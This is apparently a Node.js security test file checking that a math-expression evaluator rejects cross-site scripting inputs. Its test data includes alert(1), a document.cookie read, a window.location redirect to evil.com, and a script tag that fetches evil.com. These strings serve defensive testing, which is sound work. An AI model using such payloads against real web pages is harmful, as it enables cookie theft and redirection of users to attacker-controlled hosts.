const { test, describe } = require('node:test');
const assert = require('node:assert/strict');
const { evaluateExpression } = require('../../public/js/utils/math-evaluator.js');

describe('Security Test: Cross-Site Scripting (XSS) Prevention', () => {

    test('Math Evaluator Rejection of alert(1) Execution', () => {
        assert.equal(evaluateExpression('alert(1)'), 'Error');
    });

    test('Math Evaluator Rejection of document.cookie Access', () => {
        assert.equal(evaluateExpression('document.cookie'), 'Error');
    });

    test('Math Evaluator Rejection of window.location Redirects', () => {
        assert.equal(evaluateExpression('window.location="http://evil.com"'), 'Error');
    });

    test('Math Evaluator Rejection of <script> Tag Injections', () => {
        assert.equal(evaluateExpression('<script>fetch("http://evil.com")</script>'), 'Error');
    });
});
